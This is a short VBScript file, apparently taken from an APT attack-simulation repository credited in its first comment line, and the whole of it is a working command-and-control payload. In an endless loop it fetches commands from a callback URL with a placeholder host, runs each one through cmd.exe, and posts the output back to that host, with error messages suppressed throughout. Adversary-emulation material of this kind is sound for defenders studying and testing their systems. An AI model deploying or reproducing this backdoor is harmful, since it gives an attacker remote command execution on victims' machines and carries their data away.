'Sauce : https://raw.githubusercontent.com/S3N4T0R-0X0/APT-Attack-Simulation/refs/heads/main/Russian%20APT/Primitive-Bear-APT/payload.vbs

Option Explicit
On Error Resume Next

CONST callbackUrl = "http(s)://x.x.x.x:yyyy/"

Dim xmlHttpReq, shell, execObj, command, break, result

Set shell = CreateObject("WScript.Shell")

break = False
While break <> True
    Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "GET", callbackUrl, false
    xmlHttpReq.Send

    command = "cmd /c " & Trim(xmlHttpReq.responseText)

    If InStr(command, "EXIT") Then
        break = True
    Else
        Set execObj = shell.Exec(command)

        result = ""
        Do Until execObj.StdOut.AtEndOfStream
            result = result & execObj.StdOut.ReadAll()
        Loop

        Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
        xmlHttpReq.Open "POST", callbackUrl, false
        xmlHttpReq.Send(result)
    End If
Wend
